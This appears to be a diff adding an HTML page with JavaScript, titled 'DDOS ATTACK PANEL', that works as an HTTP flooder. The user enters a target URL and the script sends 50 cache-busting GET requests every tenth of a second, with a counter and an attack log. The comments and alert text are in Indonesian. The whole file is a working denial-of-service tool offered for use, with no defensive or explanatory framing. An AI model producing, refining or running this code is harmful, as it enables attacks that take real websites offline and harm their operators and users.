@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ DDOS ATTACK PANEL ⚡</title>
+    <style>
+        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 50px; }
+        .panel { border: 2px solid #00ff00; display: inline-block; padding: 30px; box-shadow: 0 0 20px #00ff00; }
+        input { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; width: 80%; margin: 10px 0; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; width: 85%; }
+        button:hover { background: #ff0000; color: #fff; }
+        #log { margin-top: 20px; font-size: 12px; height: 150px; overflow-y: scroll; border: 1px solid #333; padding: 10px; text-align: left; }
+        .status { color: yellow; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="panel">
+        <h2>⚡ HTTP FLOODER ⚡</h2>
+        <p>Target URL (Include http://):</p>
+        <input type="text" id="targetURL" placeholder="http://target-website.com">
+        <br>
+        <button id="fireBtn" onclick="toggleAttack()">START ATTACK</button>
+        
+        <div id="stats">
+            <p>Requests Sent: <span id="count" class="status">0</span></p>
+            <p>Status: <span id="statusLabel" class="status">READY</span></p>
+        </div>
+
+        <div id="log"></div>
+    </div>
+
+    <script>
+        let isAttacking = false;
+        let requestCount = 0;
+        let attackInterval;
+
+        function toggleAttack() {
+            const url = document.getElementById('targetURL').value;
+            if (!url) { alert("Masukin URL target, tolol!"); return; }
+
+            isAttacking = !isAttacking;
+            const btn = document.getElementById('fireBtn');
+            const statusLabel = document.getElementById('statusLabel');
+
+            if (isAttacking) {
+                btn.innerHTML = "STOP ATTACK";
+                btn.style.background = "red";
+                statusLabel.innerHTML = "ATTACKING...";
+                startFlood(url);
+            } else {
+                btn.innerHTML = "START ATTACK";
+                btn.style.background = "#00ff00";
+                statusLabel.innerHTML = "STOPPED";
+                clearInterval(attackInterval);
+            }
+        }
+
+        async function startFlood(url) {
+            attackInterval = setInterval(() => {
+                // Kirim 50 request sekaligus per interval
+                for (let i = 0; i < 50; i++) {
+                    flood(url);
+                }
+            }, 100); // Setiap 0.1 detik
+        }
+
+        async function flood(url) {
+            // Tambahin parameter acak biar gak kena cache server
+            const randUrl = url + "?flood=" + Math.random();
+            
+            try {
+                await fetch(randUrl, {
+                    mode: 'no-cors',
+                    cache: 'no-cache',
+                    method: 'GET'
+                });
+                requestCount++;
+                updateStats();
+            } catch (e) {
+                requestCount++;
+                updateStats();
+            }
+        }
+
+        function updateStats() {
+            document.getElementById('count').innerHTML = requestCount;
+            const log = document.getElementById('log');
+            const entry = document.createElement('div');
+            entry.innerHTML = `[+] Request sent to target...`;
+            log.prepend(entry);
+            if (log.childNodes.length > 20) log.removeChild(log.lastChild);
+        }
+    </script>
+</body>
+</html>
